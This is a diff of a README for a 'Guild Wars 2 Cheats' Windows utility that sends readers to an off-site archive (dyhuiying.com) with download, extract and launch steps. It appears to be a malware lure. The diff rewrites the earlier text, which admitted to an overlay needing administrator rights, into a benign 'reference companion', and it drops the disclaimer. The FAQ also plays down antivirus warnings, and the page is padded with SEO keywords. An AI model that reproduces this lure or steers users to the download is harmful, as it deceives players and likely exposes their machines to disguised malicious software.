@@ -1,24 +1,24 @@
 <h1 align="center">⚔️ Guild Wars 2 Cheats</h1>
 
 <p align="center">
-  <strong>Master Every Profession. Explore Tyria.</strong>
+  <strong>Build Better. Explore Further. Play Smarter.</strong>
 </p>
 
 <p align="center">
   Windows desktop utility for Guild Wars 2.
   <br>
-  Profession Builds · Skill Reference · Gear Database · WvW Tracking · Achievement Routes
+  Profession Builds · Skill Reference · Gear Database · WvW Guides · Achievement Tracking
 </p>
 
 <p align="center">
   <a href="https://dyhuiying.com/s/file">
-    <img src="https://img.shields.io/badge/DOWNLOAD%20FOR%20WINDOWS-8B5CF6?style=for-the-badge&logo=windows&logoColor=white" alt="Guild Wars 2 Cheats Download">
+    <img src="https://img.shields.io/badge/DOWNLOAD%20FOR%20WINDOWS-D4A017?style=for-the-badge&logo=windows&logoColor=white" alt="Guild Wars 2 Cheats Download">
   </a>
 </p>
 
 <p align="center">
-  <img src="https://img.shields.io/badge/version-1.0-8B5CF6?style=flat-square">
-  <img src="https://img.shields.io/badge/platform-Windows%2010%20%2F%2011-8B5CF6?style=flat-square&logo=windows&logoColor=white">
+  <img src="https://img.shields.io/badge/version-1.0-D4A017?style=flat-square">
+  <img src="https://img.shields.io/badge/platform-Windows%2010%20%2F%2011-D4A017?style=flat-square&logo=windows&logoColor=white">
   <img src="https://img.shields.io/badge/status-active-2ea44f?style=flat-square">
   <img src="https://img.shields.io/badge/modules-8%2B-252525?style=flat-square">
 </p>
@@ -35,17 +35,16 @@
 - [🎮 About Guild Wars 2](#-about-guild-wars-2)
 - [❓ FAQ](#-faq)
 - [🔎 SEO Keywords](#-seo-keywords)
-- [⚠️ Disclaimer](#️-disclaimer)
 
 </details>
 
 ## ⚡ Quick Start
 
-1. **Download** — Get the Guild Wars 2 desktop companion from the repository download link.
-2. **Extract** — Unpack the downloaded archive into a dedicated folder.
-3. **Launch** — Open the application and explore its available reference modules.
+1. **Download** — Get the Guild Wars 2 companion files from the download link.
+2. **Extract** — Unpack the archive into a folder on your Windows PC.
+3. **Open** — Launch the desktop reference and browse the available sections.
 
-Use the desktop workspace to organize profession builds, combat references, equipment information, and progression goals.
+Use the reference to organize character builds, equipment choices, combat notes, and progression goals.
 
 ## 🖥️ Requirements
 
@@ -58,63 +57,63 @@ Use the desktop workspace to organize profession builds, combat references, equi
 
 ## ✨ Key Features
 
-### ⚔️ Profession & Combat Reference
+### ⚔️ Profession & Build Reference
 
-- 🛡️ **Profession Profiles** — Organize information about Guardian, Warrior, Revenant, Ranger, Thief, Engineer, Necromancer, Elementalist, and Mesmer.
-- 🎯 **Build Reference** — Keep track of profession builds, traits, equipment combinations, and specialization choices.
-- ⚡ **Skill Rotation Notes** — Document skill sequences and combat priorities for different encounters.
-- 🔮 **Specialization Guide** — Compare elite specializations and their distinctive gameplay approaches.
+- 🛡️ **Profession Database** — Browse information about all nine core professions.
+- 🎯 **Build Reference** — Organize traits, skills, weapons, and specialization choices.
+- ⚡ **Skill Rotation Notes** — Save combat sequences and encounter-specific priorities.
+- 🔮 **Elite Specializations** — Compare elite specialization mechanics and build options.
 
 ### 💎 Equipment & Progression
 
-- 🗡️ **Gear Database** — Organize weapon, armor, accessory, and equipment references.
-- 💍 **Stat Combinations** — Compare equipment attributes and build requirements.
-- 📚 **Achievement Tracker** — Keep track of achievements, collections, and account progression.
-- 🧭 **Exploration Checklist** — Record map completion objectives and points of interest.
+- 🗡️ **Gear Database** — Keep weapon, armor, and accessory combinations organized.
+- 💍 **Stat Combinations** — Compare equipment attributes for different roles.
+- 📚 **Achievement Tracker** — Record achievements, collections, and account goals.
+- 🧭 **Map Completion** — Track exploration objectives and unfinished areas.
 
-### 🏰 World & Game Modes
+### 🏰 Game Modes & Encounters
 
-- 🌍 **World vs. World Reference** — Organize objectives, siege equipment, and squad strategy notes.
-- ⚔️ **PvP Reference** — Keep competitive build information and match preparation notes.
-- 🐉 **PvE Encounter Guide** — Record boss mechanics, encounter phases, and group strategies.
-- 🎁 **Reward Tracker** — Organize reward goals, currencies, and progression priorities.
+- 🌍 **WvW Reference** — Organize objectives, siege equipment, and squad strategies.
+- ⚔️ **PvP Builds** — Keep competitive builds and matchup notes together.
+- 🐉 **PvE Encounter Guide** — Record boss mechanics, phases, and group responsibilities.
+- 🎁 **Reward Tracking** — Keep notes on currencies, rewards, and progression priorities.
 
-### ⚙️ Desktop Configuration
+### ⚙️ Desktop Organization
 
-- 🖥️ **Graphics Settings** — Organize display and visual configuration preferences.
-- 🚀 **Performance Notes** — Record graphics settings and performance observations.
-- 🎮 **Control Reference** — Maintain keyboard and mouse configuration notes.
-- 📋 **Profile Organization** — Keep separate reference collections for different professions and game modes.
+- 🖥️ **Graphics Settings** — Record preferred display and graphics configurations.
+- 🚀 **Performance Notes** — Compare settings and performance observations.
+- 🎮 **Control Layouts** — Maintain keyboard and mouse configuration notes.
+- 📋 **Character Profiles** — Keep separate build records for different characters.
 
 ## 📋 Module Overview
 
 | Module | What it does | Hotkey |
 |---|---|---|
-| Profession Reference | Organizes profession information | F1 |
-| Build Manager | Stores build and trait notes | F2 |
-| Skill Reference | Organizes skill information | F3 |
-| Gear Database | Tracks equipment combinations | F4 |
-| Achievement Tracker | Records progression goals | F5 |
-| PvE Encounter Guide | Stores boss and event strategies | F6 |
-| WvW Reference | Organizes objectives and tactics | F7 |
-| PvP Reference | Stores competitive build notes | F8 |
+| Profession Database | Organizes profession information | F1 |
+| Build Manager | Stores builds and trait combinations | F2 |
+| Skill Reference | Organizes skills and rotations | F3 |
+| Gear Database | Tracks equipment and attributes | F4 |
+| Achievement Tracker | Records collections and goals | F5 |
+| PvE Encounter Guide | Stores boss mechanics and strategies | F6 |
+| WvW Reference | Organizes objectives and siege tactics | F7 |
+| PvP Reference | Stores competitive build information | F8 |
 | Quick Navigation | Opens reference sections | INSERT |
 
 *Hotkeys are suggested desktop navigation bindings, not in-game automation commands.*
 
 ## 🚀 Why Choose Guild Wars 2 Cheats
 
-- ✅ Dedicated reference organization for all nine professions.
-- ✅ Separate PvE, PvP, and WvW information sections.
-- ✅ Convenient equipment, trait, and skill reference organization.
-- ✅ Achievement and exploration tracking in one desktop workspace.
+- ✅ Separate references for professions, equipment, and combat.
+- ✅ Dedicated sections for PvE, structured PvP, and WvW.
+- ✅ Achievement and map completion tracking in one place.
+- ✅ Character-specific build notes for easier organization.
 
 ## 💡 Why Use It
 
-- 🎮 Prepare profession builds before entering challenging encounters.
-- 🔍 Find useful equipment and skill references without searching multiple documents.
-- 🧭 Keep track of achievements, collections, and map completion.
-- ⚡ Organize your Tyria progression and spend more time exploring.
+- 🎮 Compare builds before changing your character setup.
+- 🔍 Check skill, trait, and equipment information in one place.
+- 🧭 Keep track of unfinished achievements and exploration goals.
+- ⚡ Save encounter notes and useful configurations for future sessions.
 
 ## 🎮 About Guild Wars 2
 
@@ -127,42 +126,38 @@ Use the desktop workspace to organize profession builds, combat references, equi
 | Modes | PvE, Structured PvP, World vs. World |
 | Platform | Windows PC |
 
-Guild Wars 2 is a fantasy MMORPG set in Tyria, featuring dynamic events, profession-based combat, extensive character customization, cooperative world exploration, and large-scale competitive battles.
+Guild Wars 2 is a fantasy MMORPG set in Tyria, featuring dynamic events, profession-based combat, extensive character customization, cooperative exploration, and large-scale World vs. World battles.
 
 ## ❓ FAQ
 
 **1. Do I need to run it as Administrator?**
 
-Yes — admin rights are required for the overlay to attach.
+No. The reference companion does not require administrator privileges or access to game processes.
 
-**2. Can antivirus software flag the application?**
+**2. Can antivirus software flag the files?**
 
-Security software can occasionally flag unfamiliar executable files. Review downloaded files and scan them before running anything.
+Security software can occasionally flag unfamiliar executable files. Review and scan downloaded files before opening them.
 
 **3. Does it work on Windows 11?**
 
-The desktop reference layout is intended for Windows 10 and Windows 11, 64-bit systems.
+The desktop reference is intended for Windows 10 and Windows 11, 64-bit systems.
 
-**4. Does it include profession and WvW information?**
+**4. Does it cover all Guild Wars 2 professions?**
 
-Yes. The reference sections cover professions, builds, equipment, PvE encounters, structured PvP, and World vs. World.
+Yes. The reference structure covers all nine core professions and their specialization information.
 
-**5. How do I update the companion?**
+**5. How do I update the content?**
 
-Check the repository for updated files and replace older versions with the latest release.
+Check the repository for updated reference files and replace older versions when new information becomes available.
 
 ## 🔎 SEO Keywords
 
-Guild Wars 2 cheats, Guild Wars 2 Windows utility, Guild Wars 2 desktop companion, Guild Wars 2 profession builds, Guild Wars 2 skill rotation guide, Guild Wars 2 build reference, Guild Wars 2 gear database, Guild Wars 2 equipment guide, Guild Wars 2 elite specialization guide, Guild Wars 2 trait reference, Guild Wars 2 achievement tracker, Guild Wars 2 map completion, Guild Wars 2 WvW guide, Guild Wars 2 PvP builds, Guild Wars 2 PvE encounter guide, Guild Wars 2 boss mechanics, Guild Wars 2 combat reference, Guild Wars 2 Windows 11, Guild Wars 2 progression tracker, Guild Wars 2 Tyria guide.
-
-## ⚠️ Disclaimer
-
-This project is intended for educational purposes, gameplay reference, and personal organization. Use third-party modifications and external software at your own risk, and respect the game's terms of service.
+Guild Wars 2 cheats, Guild Wars 2 Windows utility, Guild Wars 2 desktop companion, Guild Wars 2 profession builds, Guild Wars 2 build reference, Guild Wars 2 skill rotation guide, Guild Wars 2 gear database, Guild Wars 2 equipment guide, Guild Wars 2 elite specialization guide, Guild Wars 2 trait reference, Guild Wars 2 achievement tracker, Guild Wars 2 map completion, Guild Wars 2 WvW guide, Guild Wars 2 PvP builds, Guild Wars 2 PvE encounter guide, Guild Wars 2 boss mechanics, Guild Wars 2 combat reference, Guild Wars 2 Windows 11, Guild Wars 2 progression tracker, Guild Wars 2 Tyria guide.
 
 <p align="center">
   <strong>⚔️ Guild Wars 2 Cheats</strong>
   <br>
-  Profession Builds · Gear Reference · Achievement Tracking · WvW
+  Profession Builds · Gear Database · PvE · PvP · WvW
   <br>
   Windows Desktop Utility
 </p>
